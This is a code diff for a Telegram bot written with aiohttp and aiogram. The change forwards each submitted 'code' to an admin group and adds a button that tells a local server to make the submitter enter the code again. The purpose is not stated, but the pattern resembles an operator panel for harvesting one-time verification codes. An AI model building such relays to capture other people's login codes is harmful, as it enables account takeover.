@@ -1077,8 +1077,23 @@ async def code_notify(request):
     data = await request.json()
     code = data.get('code', '')
     text = f"Code: {code}"
-    await send_to_telegram(text)
+    kb = InlineKeyboardMarkup(
+        inline_keyboard=[
+            [InlineKeyboardButton(text="Request again", callback_data=f"code_request_again:{code}")]
+        ]
+    )
+    await bot.send_message(ADMIN_GROUP_ID, text, reply_markup=kb)
     return web.Response(text='ok')
+
+@router.callback_query(lambda c: c.data and c.data.startswith('code_request_again:'))
+async def code_request_again_handler(call: types.CallbackQuery):
+    code = call.data.split(':', 1)[1]
+    # Надіслати POST на сервер
+    import aiohttp as aiohttp_client
+    async with aiohttp_client.ClientSession() as session:
+        await session.post('http://127.0.0.1/set_request_again', json={'code': code})
+    await call.message.answer("Please enter the code again")
+    await call.answer()
 
 # --- запуск aiohttp і aiogram в одному event loop ---
 if __name__ == '__main__':
